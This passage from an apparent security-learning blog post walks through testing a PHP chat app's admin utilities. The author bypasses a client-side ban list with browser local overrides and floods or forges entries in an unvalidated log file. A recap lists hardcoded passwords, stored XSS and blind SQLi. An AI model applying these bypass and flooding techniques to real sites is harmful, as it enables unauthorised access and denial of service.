+        <p>I bet I could just bypass this by dropping the <code>about:blank</code> request in burp suite or something like that. Lemme "ban" myself real quick and give it a shot.</p>
+
+        <p>Ok, I'm now in the "ban" list, check it out:</p>
+        <img src="/assets/img/capstone/utils/banlist.png">
+
+        <p>And just confirming that that is indeed the fingerprint that the algo has generated for me:</p>
+        <img src="/assets/img/capstone/utils/logtxt.png">
+
+        <p>Here we go, let's see if I can just intercept that redirect. And.......</p>
+
+        <p>Oh, nevermind lol. Interceptor doesn't catch it.</p>
+
+        <p>That's ok though, I have another idea. Pretty sure there's a way to create local overrides of cached files in chrome, yes? Here's the plan:</p>
+
+        <ul>
+            <li>Disable javascript temporarily</li>
+            <li>Visit <code>/landing.php</code> or any other place where <code>blacklist.php</code> gets included so that the page gets cached, and then create a local override of it—just empty the blacklist or something since it's literally just a client-side array lol.</li>
+            <li>Re-enable javascript and then we should be fine, so long as it pulls from cache.</li>
+        </ul>
+
+        <p>If you're logged in, you can visit any room just by its absolute path—you don't need to go through <code>/landing.php</code>. You could just as easily visit <code>/rooms/general/room.php</code> and it'd put you straight in the general room, everything working as expected, no catches or anything. That <code>room.php</code> file also includes <code>blacklist.php</code> so that'll be my target for now: see if I can execute the above plan on the general room's <code>room.php</code> and then still send messages in it.</p>
+
+        <p>Ok, so here's me visiting <code>blacklist.php</code>—we can see that I am indeed repeatedly being "banned" (sent to about:blank):</p>
+        <video controls src="/assets/video/capstone/utils/banned.mp4"></video>
+
+        <p>And would you just look at that:</p>
+        <video controls src="/assets/video/capstone/utils/blacklist_bypass.mp4"></video>
+
+        <p>That worked <i>perfectly</i>. Sorry the video's like 3 minutes long by the way—genuinely don't know why the page loads so slowly. But it worked! Bypassed the blacklist entirely for the <code>offtopic</code> room.</p>
+
+        <p>So essentially, the server never denies access to banned users; it just tells them to go away, and their browser can choose not to. I simultaneously love and hate that so much.</p>
+
+        <blockquote>Number of Findings Today: 6</blockquote>
+
+        <p>Next thing: let's take a look at one of the entries in that <code>log.txt</code>:</p>
+
+        <pre><code>[Tue, 00:55:32] jerry, 1917038282, 127.0.0.1 (Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36)</code></pre>
+
+        <p>There are a lot of fields here. This is the PHP that's controlling that:</p>
+
+        <pre><code>if ($_SERVER['REQUEST_METHOD'] === "POST") {
+    $id = file_get_contents("php://input");
+    $handle = fopen("./log.txt", "a+");
+
+    $data = "[".Date("D, H:i:s")."] ".$_SESSION['Username'].", ".$id.", ".$_SERVER['REMOTE_ADDR']." (".$_SERVER['HTTP_USER_AGENT'].")\n\n";
+    
+    fwrite($handle, $data);
+    fclose($handle);
+}</code></pre>
+
+        <p>So that log line is <code>date + username + id + IP addr + useragent</code>. Of those five fields, we, as the client, can control three of them: the <code>$_SESSION['Username']</code>, the <code>$id</code>, and the <code>$_SERVER['HTTP_USER_AGENT']</code>. The id param there is just the POST body—that one's probably the most straightforward. But of course, the useragent string is also really easy to spoof, and we can create any new user to manipulate our username.</p>
+
+        <p>Once again, user input is being stored in the app verbatim, zero validation of any sort.</p>
+
+        <ul>
+            <li>We could POST 50 characters, 500 MB, or like 5 GB if the server allows—we could make this file absolutely massive.</li>
+            <ul>
+                <li>Since the blacklist is operated manually in this app, an admin needs to manually look in <code>log.txt</code> in order to identify the fingerprints to blacklist—we could make the file so big it's essentially unusable.</li>
+            </ul>
+            <li>There's no authentication or rate-limiting here either so we can spam the hell out of it.</li>
+            <li>We could inject fake log entries using our POST body simply by including newlines, once again making admin's job harder.</li>
+        </ul>
+
+        <p>Here's my proof of concept for this one: from the javascript console, I POST something to <code>blacklist.php</code>. And then we look in <code>log.txt</code> and see that it's been inserted into the file. Nice and simple, this one.</p>
+
+        <p>But holy crap did it work:</p>
+        <video controls src="/assets/video/capstone/utils/emojis.mp4"></video>
+
+        <p>I guess "fingerprint" also means 100,000 🥰s to this endpoint. Fun.</p>
+
+        <p>That was only 100,000 emojis. There is <i>so</i> much more we could do there. On the scale of millions or billions—maybe multiple of those firing at once—we might even be able to crash the web server. Or at the very least, the log will be <i>very</i> unusable.</p>
+
+        <p>The ENTIRE BLACKLIST SYSTEM depends on the integrity of this log lmao, this should absolutely not be this easy to mess with. Oopsie daisy I guess.</p>
+
+        <blockquote>Number of Findings Today: 7</blockquote>
+      </section><br>
+
+      <!-- A Summary -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+        
+        <p>That's a wrap for today! A short recap of what we found:</p>
+
+        <ul>
+            <li>The database credentials in <code>conn.php</code> are hardcoded, and they're the exact same credentials as we saw in the WebSocket server as well.</li>
+            <li>The admin password in <code>users.php</code> is hardcoded, and it's also the exact same password that's being reused LITERALLY EVERYWHERE ELSE throughout the entire app, including the database password in <code>conn.php</code>.</li>
+            <li>Same story with <code>clear.php</code>'s password.</li>
+            <li>Very easy stored XSS in <code>users.php</code> because there's no input validation in the signup form.</li>
+            <li>Time-based blind SQLi in <code>clear.php</code></li>
+            <li>The blacklist is just a client-side script, so it's not hard at all to bypass.</li>
+            <li>No input validation AGAIN in <code>blacklist.php</code>, so you can completely flood the <code>log.txt</code></li>
+        </ul>
+
+        <p>Dang, 7 whole findings. That's a new record!</p>
+
+        <p>I genuinely had tons of fun with this one—especially that blacklist bypass. That's the first time I've used local overrides like that, and it was actually really cool.</p>
+
+        <p>Moral of the story: server-side code is enforced; client-side code is a suggestion. Noted.</p>
+
+        <p>Digging into the image-sending pipeline next. My bet is some file polyglot crap. Might not be, though—I don't really know yet.</p>
+
+        <i>I guess we'll have to wait and see 👀</i>
+      </section><br>
+
+      <h3>Cheers!</h3>
+    </article>
+
+    <!-- Footer -->
+    <footer class="footer">
+      <p>
+        © 2025 ADITYA BHARDWAJ | <a href="mailto:adib334@outlook.com">Email</a>
+      </p>
+      <p><small>All writeups are for educational & documentation purposes only. Happy hacking!</small></p>
+    </footer>
+  </main>
+
+  <script>
+    const TITLE = "A Handful of Admin Utilities";
+    const DATE = "2026-07-27";
+    const TAGS = ["Capstone", "Learning Journey", "PHP", "SQLi", "JavaScript", "XSS"];
+    const SECTIONS = ["Planning", "conn.php", "users.php", "clear.php", "blacklist.php (again)", "A Summary"];
+    
+    
+    let tagsDiv = document.querySelector("div#tags"); let tocUl = document.querySelector("ul#toc_ul");
+    
+    if (SECTIONS.length) {
+      SECTIONS.forEach(section => {
+        tocUl.insertAdjacentHTML(
+          "beforeend",
+          `<li><a class="sectlink" href="#${section.toLowerCase().replace(/\s+/g, "_").replace(/\p{P}/gu, "")}">${section}</a></li>`
+        );
+      });
+    }
+
+    TAGS.forEach(tag => tagsDiv.innerHTML += `<span class="tag">${tag}</span>` );
+
+    document.querySelector("title").innerText = `The Offsec Journal | ${TITLE}`;
+    document.querySelector("h1#bigtitle").innerText = TITLE;
+    
+    document.querySelector("time#date").setAttribute("datetime", DATE);
+    document.querySelector("time#date").textContent = new Date(DATE).toLocaleString("en-US", { dateStyle: "long", timeZone: "UTC" });
+    
+    document.querySelectorAll("section.blog-section").forEach((s, i) => { if (SECTIONS[i]) s.id = SECTIONS[i].toLowerCase().replace(/\s+/g, "_").replace(/\p{P}/gu, "") });
+    document.querySelectorAll("h2.sectheading").forEach((s, i) => { if (SECTIONS[i]) s.innerText = SECTIONS[i] });
+  </script>
+</body>
+</html>
